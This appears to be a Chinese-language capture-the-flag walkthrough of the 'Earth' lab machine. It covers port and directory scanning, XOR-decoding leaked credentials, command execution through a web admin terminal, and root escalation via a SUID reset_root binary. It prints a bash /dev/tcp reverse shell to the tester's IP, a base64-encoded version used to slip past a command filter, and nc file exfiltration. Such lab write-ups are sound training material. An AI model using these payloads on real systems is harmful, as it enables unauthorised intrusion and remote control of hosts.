# **The Plant:Earth**

### **一.主机发现**

`sudo nmap -sn 192.168.10.0/24`

![image-20250218153804800](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218153804800.png)

#### 可以看到靶机的ip:192.168.10.190

### **二.nmap四扫**

#### **①端口探测**

`sudo nmap --min-rate 10000 -p- 192.168.10.190 -oA nmapscan/ports`

![image-20250218154319131](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218154319131.png)

#### **②udp扫描**

`sudo nmap -sU --top-ports 20 192.168.10.190 -oA nmapscan/udp`

![image-20250218154428971](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218154428971.png)

==没有什么有用的信息==

#### **③详细信息扫描**

`sudo nmpascan -sT -sV -sC -O -p22,80,443 -oA nmapscan/details`

![image-20250218154730741](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218154730741.png)

`Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local`

==有DNS解析，需要添加到`/etc/hosts`文件==

`sudo sed -i "1i 192.168.10.190 earth.local terratest.earth.local"`

![image-20250218155541430](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218155541430.png)

`Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (95%), Linux 5.4 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)`==很大概率是linux系统==

#### **④漏洞脚本扫描**

`sudo nmap --script=vuln -p22,80,443 192.168.10.190 -oA nmapscan/vuln`

![image-20250218155745025](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218155745025.png)

==没有什么有用的信息==

### **三.80端口和443端口**

![image-20250218162414496](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218162414496.png)

![image-20250218162427061](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218162427061.png)

==有张图片，下载下来==

![image-20250218162527497](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218162527497.png)

`wget http://earth.local/static/earth1.jpg`

`exiftool earth1.jpg`==没有什么收获==

![image-20250218162905700](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218162905700.png)

`terratest.earth.local`==也没有什么收获==，试试目录爆破



`sudo gobuster dir -u http://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![image-20250218163446694](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218163446694.png)

==就一个admin，先试试看==

![image-20250218163602548](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218163602548.png)

![image-20250218163629253](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218163629253.png)

`sudo gobuster dir -u http://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`

==添加下扩展名，再扫一次==

`sudo gobuster dir -u http://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e -t 100`

![image-20250218170344169](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218170344169.png)

`earth.local`应该是没有了

`sudo gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![image-20250218163319028](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218163319028.png)

==https好像不能用gobuster爆破==

`sudo gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt,html` ==原来是得忽略证书，还得添加扩展名==

![image-20250218164413257](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218164413257.png)

==-e 补充为完整的url，还可以-t 增加线程数==

![image-20250218165103350](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218165103350.png)

`https://terratest.earth.local/.html                (Status: 403) [Size: 199]
https://terratest.earth.local/index.html           (Status: 200) [Size: 26]
https://terratest.earth.local/robots.txt           (Status: 200) [Size: 521]
https://terratest.earth.local/.html                (Status: 403) [Size: 199]`

==都看看==

![image-20250218165301559](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218165301559.png)

![image-20250218165318267](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218165318267.png)

##### ==有testingnotes的文件，后缀还不知道，优先试试txt，php，html==

![image-20250218165526029](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218165526029.png)

`Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.`

`测试安全消息系统注意事项：
*使用XOR加密作为算法，应该与RSA中使用的一样安全。
*地球已经确认他们已经收到了我们发送的信息。
*testdata.txt用于测试加密。
*terra用作管理门户的用户名。
待办事项：
*我们如何安全地将每月的密钥发送到地球？或者我们应该每周换钥匙吗？
*需要测试不同的密钥长度以防止暴力。钥匙应该有多长？
*需要改进消息传递界面和管理面板的界面，目前这是非常基本的。`



`https://terratest.earth.local/testdata.txt`

![image-20250218165641334](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218165641334.png)

==现在就是已经知道testdata.txt作为一个key可以进行解码，但是要解码的是什么，那应该是前面Previous message，terra可以作为账号，那接出来的密码应该就是这个账号的密码，先试试==`earth.local`

![image-20250218170940952](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218170940952.png)

![image-20250218170955704](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218170955704.png)

==那可以用这里进行解码，这里也是满足xor==

==message应该就是下面很长的字符串==

![image-20250218171154096](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218171154096.png)

==好吧输不进去，那就自己写个exp.py==

![image-20250218172335128](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218172335128.png)

==下载文件需要检查证书==





    xor.py
    
    import binascii
    def xor_strings_to_hex(hex_str, file_path):
        try:
    		读取文件内容并转换为十六进制字符串
            with open(file_path, 'rb') as f:
                file_hex = binascii.b2a_hex(f.read()).decode()
        	# 确保两者长度一致，按最短长度处理
        	min_len = min(len(hex_str), len(file_hex))
        	hex_str, file_hex = hex_str[:min_len], file_hex[:min_len]
    
        	# 十六进制字符串转换为整数并进行异或
        	result = int(hex_str, 16) ^ int(file_hex, 16)
    
       		# 返回结果的十六进制形式，去除 '0x' 并补零对齐
        	return hex(result)[2:].zfill(min_len)
    
    	except (binascii.Error, ValueError) as e:
        	return f"输入错误: {e}"
    if __name__ == "__main__":
        data1 = '2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a'
        file_path = 'testdata.txt'
        
        hex_result = xor_strings_to_hex(data1, file_path)
    print("异或结果 (十六进制):", hex_result)`

==只有第三个能用，另外两个都是乱码==

![image-20250218173131815](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218173131815.png)

账号：`terra`

密码：`earthclimatechangebad4humans`

==有了账号密码，肯定是优先ssh，22端口也有开放==

![image-20250218174559380](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218174559380.png)

==看来不行啊，哦哦，前面有个/admin/login的登陆界面==

![image-20250218174815794](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218174815794.png)

==这里可以登陆，而且看来是个命令行终端，先尝试几个命令==

![image-20250218180025375](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180025375.png)

![image-20250218180043764](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180043764.png)

![image-20250218180113822](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180113822.png)

![image-20250218180132022](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180132022.png)

==试试能不能获得反弹shell==

`bash -i >& /dev/tcp/192.168.10.175/4444 0>&1 `

==设置监听==：`sudo rlwrap -cAr nc -lvnp 4444`

![image-20250218180501386](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180501386.png)

![image-20250218180517444](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180517444.png)

==不能远程命令执行，去查了一下，可以试试字符串绕过==

![image-20250218180722771](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180722771.png)

`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjE3NS80NDQ0IDA+JjEK" | base64 -d | bash`

![image-20250218180826499](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218180826499.png)

==成功获得shell，先确认机器是否为靶机（避免陷入蜜罐）==

![image-20250218181007286](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218181007286.png)

==就是靶机了，先找找user flag==

`find / -name "*flag*" 2>/dev/null`

![image-20250218181158549](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218181158549.png)

==找到了==

### **四.提权**

```
sudo -l
ps aux
cat /etc/crontab
find / -perm -u=s 2>/dev/null
```

==以上四个试了后只发现最后一个有东西==

![image-20250218181705562](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218181705562.png)

`reset_root`==这个可执行文件最让我感兴趣了，那就执行一下==

![image-20250218181827940](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218181827940.png)

==不知道是什么问题，下载在本地看看吧==

本地：`sudo nc -lvnp 6666 > reset_root`

![image-20250218182619604](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218182619604.png)

靶机：`nc 192.168.10.175 6666 < /usr/bin/reset_root`

![image-20250218182745995](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218182745995.png)

![image-20250218182851217](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218182851217.png)

==用strings看看吧==

![image-20250218183004976](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218183004976.png)

==执行成功后root密码就重置为Earth==

![image-20250218183315507](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218183315507.png)

==有个文件，去看看，但是这个文件好像不关提权的事==

![image-20250218183621479](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218183621479.png)

==没权限执行，那这个利用不了，去看大佬的wp，发现可以使用strace==

==把chpasswd也给打包走，就是不知道权限够不够==

![image-20250218183901247](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218183901247.png)

==用strings看看chpasswd==

`strings chpasswd`

![image-20250218184104844](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218184104844.png)

==好家伙，还有help，去靶机上看看，有个-R参数能用==

![image-20250218184330244](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218184330244.png)

==权限还是不够，只能重新看回reset_root，试试strace==

![image-20250218185622932](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218185622932.png)

==好像是缺少这三个文件，去看看靶机有没有==

![image-20250218185854141](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218185854141.png)

==靶机没有，那就创建==

![image-20250218190154849](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190154849.png)

==然后执行一下==

![image-20250218190311579](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190311579.png)

==已经重置了，尝试下登陆==

![image-20250218190354316](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190354316.png)

==可以了，用python3提升下命令交互性==

`python3 -c "import pty;pty.spawn('/bin/bash')"`

![image-20250218190532981](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190532981.png)

![image-20250218190732848](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190732848.png)

![image-20250218190751887](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250218190751887.png)